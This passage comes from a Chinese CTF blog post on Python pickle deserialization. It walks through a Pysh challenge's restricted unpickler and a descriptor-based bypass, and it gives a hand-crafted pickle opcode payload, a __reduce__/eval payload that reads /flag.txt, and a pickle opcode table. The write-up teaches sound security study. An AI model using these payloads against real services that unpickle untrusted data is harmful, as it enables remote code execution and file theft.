class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># File: securePickle.py</span><br><span class="line">import pickle</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module not in whitelist or &#x27;.&#x27; in name:</span><br><span class="line">            raise KeyError(&#x27;The pickle is spoilt :(&#x27;)</span><br><span class="line">        return pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def loads(s):</span><br><span class="line">    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># File: server.py</span><br><span class="line">import securePickle as pickle</span><br><span class="line">import codecs</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(&#x27;structs&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Pysh(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.key = os.urandom(100)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            &#x27;help&#x27;: self.cmd_help,</span><br><span class="line">            &#x27;whoami&#x27;: self.cmd_whoami,</span><br><span class="line">            &#x27;su&#x27;: self.cmd_su,</span><br><span class="line">            &#x27;flag&#x27;: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    def login(self):</span><br><span class="line">        with open(&#x27;../flag.txt&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = bytes(a ^ b for a, b in zip(self.key, flag))</span><br><span class="line">        user = input().encode(&#x27;ascii&#x27;)</span><br><span class="line">        user = codecs.decode(user, &#x27;base64&#x27;)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        print(&#x27;Login as &#x27; + user.name + &#x27; - &#x27; + user.group)</span><br><span class="line">        user.privileged = False</span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            req = input(&#x27;$ &#x27;)</span><br><span class="line">            func = self.cmds.get(req, None)</span><br><span class="line">            if func is None:</span><br><span class="line">                print(&#x27;pysh: &#x27; + req + &#x27;: command not found&#x27;)</span><br><span class="line">            else:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    def cmd_help(self):</span><br><span class="line">        print(&#x27;Available commands: &#x27; + &#x27; &#x27;.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    def cmd_whoami(self):</span><br><span class="line">        print(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    def cmd_su(self):</span><br><span class="line">        print(&quot;Not Implemented QAQ&quot;)</span><br><span class="line">        # self.user.privileged = 1</span><br><span class="line"></span><br><span class="line">    def cmd_flag(self):</span><br><span class="line">        if not self.user.privileged:</span><br><span class="line">            print(&#x27;flag: Permission denied&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(bytes(a ^ b for a, b in zip(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"># File: structs.py</span><br><span class="line">class User(object):</span><br><span class="line">    def __init__(self, name, group):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = 0</span><br><span class="line">        self.prompt = &#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>RestrictedUnpickler 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。</p>
<p>注意到，在 cmd_flag() 中，self.user.privileged 只要就符合条件将输出 flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">user.privileged = False  # 这个有点猛，后面还有赋值，没法直接覆盖了</span><br></pre></td></tr></table></figure>
<p>魔术方法列表中可以看到，给属性赋值时，用的是 <strong>setattr</strong>(self, name)，能不能把这个干掉？</p>
<p>看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 privileged ，同时又不干扰 flag？</p>
<p>继续在魔术方法里寻找，突然看到了一个创建描述符对象里有 <strong>set</strong> 方法，会不会有点关系呢。</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t010199e6e302570fb8.jpg"><img src="https://p3.ssl.qhimg.com/t010199e6e302570fb8.jpg" alt="img"></a></p>
<blockquote>
<p>属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，a.x 的查找顺序会从 a.<strong>dict</strong>[‘x’] 开始，然后是 type(a).<strong>dict</strong>[‘x’]，接下来依次查找 type(a) 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则 Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。</p>
</blockquote>
<p>关于描述符的讲解还可以看下这文章：<a target="_blank" rel="noopener" href="https://foofish.net/what-is-descriptor-in-python.html">https://foofish.net/what-is-descriptor-in-python.html</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RevealAccess</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A data descriptor that sets and returns values</span></span><br><span class="line"><span class="string">       normally and prints a message logging their access.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, initval=<span class="literal">None</span>, name=<span class="string">&#x27;var&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.val = initval</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get__</span>(<span class="params">self, obj, objtype</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Retrieving&#x27;</span>, <span class="variable language_">self</span>.name)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.val</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__set__</span>(<span class="params">self, obj, val</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Updating&#x27;</span>, <span class="variable language_">self</span>.name)</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">MyClass</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">... </span>    x = RevealAccess(<span class="number">10</span>, <span class="string">&#x27;var &quot;x&quot;&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>    y = <span class="number">5</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = MyClass()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">&quot;x&quot;</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x = <span class="number">20</span></span><br><span class="line">Updating var <span class="string">&quot;x&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">&quot;x&quot;</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.y</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>可清楚的看到，对属性 x 的操作都被 “hook” 住了，而 y 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的 RevealAccess，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__set__</span>(<span class="params">self, obj, val</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">m = MyClass()</span><br><span class="line">MyClass.x = m</span><br><span class="line"><span class="built_in">print</span>(m.x)</span><br><span class="line">m.y = <span class="number">6</span></span><br><span class="line"><span class="built_in">print</span>(m.y)</span><br><span class="line">m.x = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(m.x)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>把这个过程转为 pickle：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(I111</span><br><span class="line">I222</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(N&#125;S&#x27;__set__&#x27;</span><br><span class="line">g100</span><br><span class="line">sS&#x27;privileged&#x27;</span><br><span class="line">g101</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
<p>看一下结果：</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/dm/1024_656_/t01fe621874c16e4543.jpg"><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/t01fe621874c16e4543.jpg" alt="img"></a></p>
<h2 id="CISNC2019-iKun">CISNC2019 iKun</h2>
<p><img src="/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/image-20200316124155120.png" alt="image-20200316124155120"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">catflag</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#return (eval, (&quot;ls /&quot;,))</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload= pickle.dumps(catflag())</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span> (urllib.quote(payload))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Python Opcode</h1>
<p>pickle.py–&gt;opcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span></span><br><span class="line"><span class="comment"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="comment"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<p><a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">PDF</a></p>
<p><a target="_blank" rel="noopener" href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/关于Python-sec的一些总结/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.codercto.com/a/81823.html">https://www.codercto.com/a/81823.html</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://991688344.github.io">LYC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://991688344.github.io/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/">http://991688344.github.io/2020/03/07/python-Pickle%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://991688344.github.io" target="_blank">Rick</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="post-meta__tags" href="/tags/Python/">Python</a></div><div class="post-share"><div class="social-share" data-image="/images/Wallpaper/eatham.gif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/03/09/0CTF2016/" title="0CTF2016"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">0CTF2016</div></div><div class="info-2"><div class="info-item-1">piapiapia  数组绕过正则 反序列化长度问题导致的尾部字符逃逸   顺手存一下图片~  输入admin@admin（@表示分割姓名密码）提示Invalid user name or password 输入admin@1提示Invalid password 输入admin@asd提示Invalid user name or password 输入admin@123提示Invalid user name or password 输入sadaaaaaa@asdddd提示Invalid user name 输入username=aaaaaaaaaabbbbbbb&amp;password=21提示Invalid user name 输入username=aaaaaaaaaabbbbb&amp;password=22提示Invalid password 输入username=aaaaaaaaaabbbbbb&amp;password=211提示Invalid user name or password 貌似和长度有关系，但是没看到有啥用 扫一下目录发现 12Dir found:...</div></div></div></a><a class="pagination-related" href="/2020/03/06/%E5%93%88%E7%B3%BB%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB-hashpumpy/" title="哈系长度扩展攻击-hashpumpy"><img class="cover" src="/images/Wallpaper/eatham.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">哈系长度扩展攻击-hashpumpy</div></div><div class="info-2"><div class="info-item-1">工具 12345git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 至于想在python里实现hashpump，可以使用hashpumpy这个插件： （注意还是得先安装了libssl-dev） 1pip install hashpumpy 推荐在linux里使用，使用方法可以这样获取： 123python&gt;&gt;&gt; import hashpumpy&gt;&gt;&gt; help(hashpumpy.hashpump) HashPump用法 这里以一个实验吧题目为例，关键的代码大概如下： [](javascript:void(0);) 1234567891011&lt;?php$secret=&quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/03/12/Python-Opcode%E5%8F%8A%E5%88%A9%E7%94%A8Opcode%E7%BB%95%E8%BF%87python%E6%B2%99%E7%AE%B1/" title="Python-Opcode及利用Opcode绕过python沙箱"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-12</div><div class="info-item-2">Python-Opcode及利用Opcode绕过python沙箱</div></div><div class="info-2"><div class="info-item-1">0x01 OpCode opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。 